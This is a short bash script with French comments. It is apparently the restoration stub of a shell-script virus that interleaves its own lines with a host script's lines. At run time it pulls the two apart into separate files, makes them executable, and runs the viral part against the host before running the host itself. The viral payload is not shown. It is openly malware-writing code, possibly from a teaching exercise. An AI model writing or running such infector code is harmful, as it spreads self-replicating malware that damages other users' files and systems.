#!/bin/bash
R=23  # nombre de lignes du code de restauration
LV=38  # nombre de lignes du code viral 
L=$(wc -l $0 | cut -d " " -f1)
tail -n $(($L-$R)) $0 > temp.sh
L=$(wc -l temp.sh | cut -d " " -f1)
s=$(( ($L-$LV) / $LV ))
cp /dev/null restauration-cible.sh
cp /dev/null restauration-codeviral.sh
i=0
while [ $i -lt $(($LV)) ]
do
    echo "i=$i"
    head -n $(($i*($s+1)+$s))  temp.sh | tail -n $s >> restauration-cible.sh  
    head -n $((($i+1)*($s+1)))  temp.sh | tail -n 1 >> restauration-codeviral.sh
    i=$(($i+1))
done
tail -n $(($L-$LV*($s+1))) temp.sh >> restauration-cible.sh
chmod u+x restauration-cible.sh restauration-codeviral.sh
./restauration-codeviral.sh $0 
./restauration-cible.sh
#rm restauration-cible.sh restauration-codeviral.sh 
exit   ################################################ fin restauration   
